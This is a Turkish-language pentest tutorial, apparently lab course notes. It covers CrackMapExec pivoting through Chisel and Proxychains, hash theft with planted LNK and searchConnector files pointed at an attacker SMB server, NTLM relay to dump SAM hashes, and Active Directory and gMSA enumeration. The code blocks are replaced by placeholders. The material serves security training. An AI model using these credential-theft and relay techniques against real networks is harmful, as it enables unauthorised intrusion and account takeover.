Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

